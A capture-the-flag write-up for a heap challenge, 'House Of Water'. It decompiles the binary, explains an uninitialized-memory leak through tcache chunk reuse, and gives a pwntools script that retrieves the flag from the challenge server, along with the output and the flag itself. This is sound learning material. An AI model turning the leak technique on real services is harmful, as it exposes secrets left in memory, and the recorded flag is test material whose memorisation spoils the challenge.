---
title: House Of Water
tags:
    - Binary Exploitation
---

# House Of Water

**Binary Exploitation**

## Challenge Description

The Soul Vault suffered metadata corruption during a recovery operation. Identify the valid recovered block and decode its contents.

**File Attachments :**
* [chal](chal)
* [ld-linux-x86-64.so.2](ld-linux-x86-64.so.2)
* [libc.so.6](libc.so.6)

## Exploit

I started by opening the binary in Ghidra and analyzing the `setup` function:

```c
void setup(void)
{
  char *__s;
  FILE *__stream;
  char *pcVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  __s = malloc(0x80);
  if (__s == (char *)0x0) {
    die("malloc failed");
  }
  memset(__s,0,0x80);
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    builtin_strncpy(__s,"flag{missing_flag_txt}\n",0x18);
  }
  else {
    pcVar1 = fgets(__s,0x80,__stream);
    if (pcVar1 == (char *)0x0) {
      builtin_strncpy(__s,"flag{missing_flag_txt}\n",0x18);
    }
    fclose(__stream);
  }
  return;
}
```

In the `setup` function, the program disables I/O buffering and allocates a chunk of 128 bytes (0x80) on the heap using `malloc()`, safely zeroing it out with `memset()`. It then opens `flag.txt` and uses `fgets()` to read the flag directly into this newly allocated heap chunk.

After this setup, connecting to the binary reveals a classic heap exploitation interface:
```
1) malloc
2) free
3) edit
4) show
5) exit
```

The vulnerability lies in how the heap manager recycles memory. After the `setup` function reads the flag into the `0x80` chunk, that chunk is freed and placed into the tcache (Thread Local Caching) bin for size `0x80`.

Because `malloc()` does not zero out the memory it returns (unlike `calloc()`), if we request a new chunk of the exact same size (`0x80`), the heap manager will hand us back the exact same chunk from the tcache. Since the program doesn't clear the memory upon our allocation, the flag is still sitting inside it. This is a classic Uninitialized Heap Memory leak.

Here is the `pwntools` script I used to automates the allocations, handles the prompts, and parses the hex dump :
```py
from pwn import *

# Connect to the remote server
io = remote('145.239.142.129', 1341)

# Allocate a chunk of 0x80 at index 0
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Index: ", b"0")
io.sendlineafter(b"Size: ", b"128")

# Show the content of index 0
io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"Index: ", b"0")
io.sendlineafter(b"Offset: ", b"0")
io.sendlineafter(b"Length: ", b"128") # Here it asks for "Length:", not "Size:"

# Parse the output to get the flag
# We read the first line of the hex dump
hex_dump = io.recvline().strip()
hex_dump += io.recvline().strip()
hex_dump += io.recvline().strip()

# Clean the string (remove spaces) and decode from hex
clean_hex = hex_dump.replace(b" ", b"")
# We decode it and split at the null byte \x00 to remove the trailing zeros
flag = bytes.fromhex(clean_hex.decode()).split(b'\x00')[0].decode()

log.success(f"Flag: {flag}")

io.close()
```

Output :
```
[+] Opening connection to 145.239.142.129 on port 1341: Done
[+] Flag: OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}
[*] Closed connection to 145.239.142.129 port 1341
```
